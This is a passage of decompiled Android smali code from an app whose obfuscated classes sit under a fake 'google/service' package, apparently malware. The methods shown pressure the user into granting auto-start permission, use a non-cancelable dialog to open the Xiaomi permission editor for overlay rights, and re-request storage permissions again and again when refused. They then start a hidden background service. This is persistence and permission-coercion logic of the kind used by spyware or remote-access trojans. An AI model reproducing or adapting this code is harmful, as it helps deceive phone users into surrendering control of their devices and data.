    goto :goto_0

    :cond_4
    const/4 v0, 0x0

    :goto_1
    if-lez v0, :cond_6

    .line 211
    sget-object v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->POWERMANAGER_INTENTS:[Landroid/content/Intent;

    array-length v1, v0

    :goto_2
    if-ge v2, v1, :cond_6

    aget-object v4, v0, v2

    .line 213
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    const/high16 v6, 0x10000

    invoke-virtual {v5, v4, v6}, Landroid/content/pm/PackageManager;->resolveActivity(Landroid/content/Intent;I)Landroid/content/pm/ResolveInfo;

    move-result-object v5

    if-eqz v5, :cond_5

    const-string v0, "Please Enable Auto Start Permission to continue ."

    .line 216
    invoke-static {p0, v0, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    const/high16 v0, 0x10000000

    .line 218
    invoke-virtual {v4, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 219
    invoke-virtual {p0, v4}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->startActivity(Landroid/content/Intent;)V

    .line 220
    invoke-static {}, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802upd_;->getInstance()Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802upd_;

    move-result-object v0

    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802upd_;->getAutoStartPermission(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :cond_5
    add-int/lit8 v2, v2, 0x1

    goto :goto_2

    :catch_0
    :cond_6
    :goto_3
    return-void
.end method

.method public finish()V
    .locals 2

    const/4 v0, 0x1

    .line 610
    sput-boolean v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->IamDone:Z

    .line 612
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 613
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 615
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3

    const-string v0, ""

    .line 288
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 298
    :try_start_0
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sput-object p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;->appContext:Landroid/content/Context;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const/4 p1, 0x1

    .line 307
    :try_start_1
    invoke-virtual {p0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->requestWindowFeature(I)Z

    .line 308
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/16 v1, 0x400

    invoke-virtual {p1, v1, v1}, Landroid/view/Window;->setFlags(II)V

    .line 313
    new-instance p1, Landroid/graphics/Point;

    invoke-direct {p1}, Landroid/graphics/Point;-><init>()V

    .line 314
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v1

    invoke-interface {v1}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v1

    invoke-virtual {v1, p1}, Landroid/view/Display;->getSize(Landroid/graphics/Point;)V

    .line 315
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v2, p1, Landroid/graphics/Point;->x:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->display_width:Ljava/lang/String;

    .line 316
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p1, p1, Landroid/graphics/Point;->y:I

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->display_height:Ljava/lang/String;

    .line 319
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const v0, 0x7f090010

    invoke-virtual {p1, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->pr:Ljava/lang/String;

    const/16 p1, 0x3a98

    .line 321
    invoke-static {p0, p1}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->ʾʼʾʿˈᵔঙʿ$ʿʼ₫䉀θᵢיʿᘣθˉˆˉθφˎ$ˉˎ$ﹳˊⶱⁱᵇʾ䉀ˑ$ˏـﹳﾞ$ʽ(Landroid/content/Context;I)V

    .line 322
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x17

    if-lt p1, v0, :cond_0

    .line 323
    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_0

    const-string p1, "xiaomi"

    .line 324
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    sget-object v1, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v0, v1}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 325
    new-instance p1, Landroid/content/Intent;

    const-string v0, "miui.intent.action.APP_PERM_EDITOR"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v0, "com.miui.securitycenter"

    const-string v1, "com.miui.permcenter.permissions.PermissionsEditorActivity"

    .line 326
    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v0, "extra_pkgname"

    .line 328
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v0, 0x10000000

    .line 329
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 330
    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "Please Enable the additional permissions"

    .line 331
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "You will not receive notifications while the app is in background if you disable these permissions"

    .line 332
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "Go to Settings"

    new-instance v2, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$1;

    invoke-direct {v2, p0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$1;-><init>(Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;Landroid/content/Intent;)V

    .line 333
    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    const v0, 0x108009b

    .line 345
    invoke-virtual {p1, v0}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    const/4 v0, 0x0

    .line 346
    invoke-virtual {p1, v0}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    .line 347
    invoke-virtual {p1}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    .line 352
    :cond_0
    iget-object p1, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->StoragPermissions:[Ljava/lang/String;

    invoke-static {p0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_1

    sget-object p1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    const-string v0, "null"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1

    .line 353
    iget-object p1, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->StoragPermissions:[Ljava/lang/String;

    iget v0, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->PERMISSION_ALL:I

    invoke-static {p0, p1, v0}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    goto :goto_0

    .line 357
    :cond_1
    const-class p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-static {p1, v0}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_2

    .line 358
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 360
    :cond_2
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->CheckBind()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :goto_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 0

    .line 470
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x22b

    if-eq p1, p2, :cond_0

    goto :goto_0

    .line 474
    :cond_0
    array-length p1, p3

    const/4 p2, 0x0

    if-lez p1, :cond_1

    aget p1, p3, p2

    if-nez p1, :cond_1

    .line 477
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->CheckBind()V

    .line 479
    const-class p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplication()Landroid/app/Application;

    move-result-object p2

    invoke-static {p1, p2}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_2

    .line 480
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-class p3, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-direct {p1, p2, p3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_1
    const-string p1, "Please Allow Permission To Continue."

    .line 484
    invoke-static {p0, p1, p2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 486
    iget-object p1, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->StoragPermissions:[Ljava/lang/String;

    iget p2, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->PERMISSION_ALL:I

    invoke-static {p0, p1, p2}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :cond_2
    :goto_0
    return-void
.end method
